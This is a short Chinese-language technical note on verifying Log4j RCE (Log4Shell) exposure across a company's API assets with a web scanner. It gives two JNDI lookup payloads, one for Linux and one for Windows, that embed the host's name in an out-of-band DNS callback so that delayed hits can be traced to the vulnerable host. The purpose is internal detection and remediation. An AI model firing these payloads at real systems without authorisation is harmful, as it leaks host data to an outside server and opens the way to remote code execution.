## Web漏扫扫描Log4j RCE漏洞

在使用Web漏扫对公司API资产做Log4j RCE漏洞验证时会遇到一种情况：payload打出去了，但是在dns记录中过了很久才收到记录，而且dns中的域名使用的是随机字符串，根本不知道这是哪条API打出去触发的。下面提供了一种解决思路。

通过分析Log4j-Core支持的几种*Lookup, 可以将主机名记录到dns记录中。下面分别是Linux操作系统和Windows操作系统的payload:
  
- Linux payload: ${jndi:ldap://${env:HOSTNAME}.log4j.dnslog/} 
- windows payload: ${jndi:ldap://${env:COMPUTERNAME}.log4j.dnslog/} 

这种方式可以长期监控DNS请求数据库，有*.log4j.dnslog的请求，直接推修主机相关服务即可。

